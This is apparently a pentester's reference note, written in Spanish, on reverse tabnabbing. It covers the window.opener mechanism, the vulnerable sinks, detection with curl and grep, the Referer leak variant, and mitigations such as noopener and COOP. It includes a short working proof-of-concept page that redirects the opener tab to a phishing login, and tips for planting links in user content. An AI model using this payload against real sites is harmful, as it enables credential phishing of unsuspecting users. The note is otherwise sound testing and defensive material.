---
tipo: meta
aliases:
  - window.opener
  - noopener
  - Cross-Origin-Opener-Policy
tags:
  - meta/referencia
  - dominio/web
---

# Tabnabbing - matriz de referencia

> [!info] Referencia pura, no un zettel
> La mecánica, los sinks vulnerables y cómo encontrarlos. El criterio está en las dos notas de `600-tradecraft/`; el modelo, en [[MOC - Tabnabbing]].

Dominio compacto: una sola matriz cubre la mecánica, el reconocimiento y la mitigación.

## 1. La prueba de concepto

La página que se abre en pestaña nueva, que redirige a la abridora:

```html
<!doctype html>
<html><body>
<script>
  if (window.opener) {
    window.opener.location = 'https://phishing-objetivo.com/login';
  }
</script>
Contenido señuelo cualquiera.
</body></html>
```

Confirmar que hay `opener`: `if (window.opener) alert('vulnerable')`.

## 2. Los sinks — dónde nace un `opener` accesible

| Sink | Vulnerable si |
|---|---|
| `<a target="_blank" href="...">` | falta `rel="noopener"` |
| `window.open(url)` | sin `'noopener'` en el tercer argumento |
| `window.open(url, '_blank')` | igual, sin `noopener` |
| `<form target="_blank">` | el submit abre con opener |
| `<area target="_blank">` | mapas de imagen, mismo caso |

## 3. Detectar enlaces vulnerables

En el HTML del objetivo:

```sh
curl -s https://objetivo.com/pagina | grep -oE '<a[^>]*target="?_blank"?[^>]*>' | grep -v 'noopener'
```

Los `<a target="_blank">` que **no** contienen `noopener` (ni `noreferrer`) son candidatos. Revisar sobre todo:

- Enlaces salientes a terceros → [[Tabnabbing - secuestro por enlace saliente]].
- Enlaces de contenido de usuario (comentarios, perfiles, markdown) → [[Tabnabbing - enlace plantado en contenido de usuario]].

Probar un enlace publicado propio y mirar cómo lo renderiza: si sale `target="_blank"` sin `noopener`, es explotable.

## 4. Probar el estado del navegador

Los navegadores modernos aplican `noopener` por defecto a `target="_blank"`, pero no todos:

```js
// en la consola de la página abierta
console.log(window.opener);   // null = protegido; objeto = vulnerable
```

`null` → el navegador ya cortó la referencia. Un objeto → `opener` accesible, explotable.

## 5. Variante de fuga de origen (`Referer`)

Aun con `noopener`, si falta `noreferrer`, la página abierta recibe la URL de origen en el `Referer` —fuga de información si esa URL lleva un token o un identificador—. Es menor que el secuestro pero vale mirarlo:

```
Referer: https://objetivo.com/documento?token=SECRETO
```

Mitigación: `rel="noopener noreferrer"` o `Referrer-Policy`.

## 6. Las mitigaciones — para el informe

| Defensa | Qué corta |
|---|---|
| `rel="noopener"` | La referencia `window.opener` |
| `rel="noreferrer"` | `opener` **y** el `Referer` |
| `window.open(u,'_blank','noopener')` | Igual, para aperturas por JS |
| `Cross-Origin-Opener-Policy: same-origin` | `opener` entre orígenes, a nivel de cabecera |
| `Referrer-Policy: no-referrer` / `strict-origin` | La fuga de `Referer` |

`rel="noopener"` en cada enlace es el arreglo directo; `COOP` es la defensa en profundidad a nivel de sitio, que no depende de acordarse en cada enlace.

## 7. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| `window.opener` es `null` | El navegador aplicó `noopener` por defecto, o el enlace lo lleva. No explotable ahí |
| El enlace lleva `noopener` | Protegido. Buscar otro enlace |
| `opener` existe pero `opener.location` falla | COOP activo, u otra protección de ventana |
| El sitio no abre en pestaña nueva | Sin `target="_blank"` no hay opener |
| El markdown agrega `noopener` | Renderizador moderno. Buscar un campo que no lo haga |
| La víctima nota el cambio de URL | El phishing depende de que no mire la barra; techo de la técnica |

## Relacionadas

[[MOC - Tabnabbing]] · [[Tabnabbing - secuestro por enlace saliente]] · [[Clickjacking - encuadre - matriz de referencia]] · [[Sesión - matriz de referencia]]
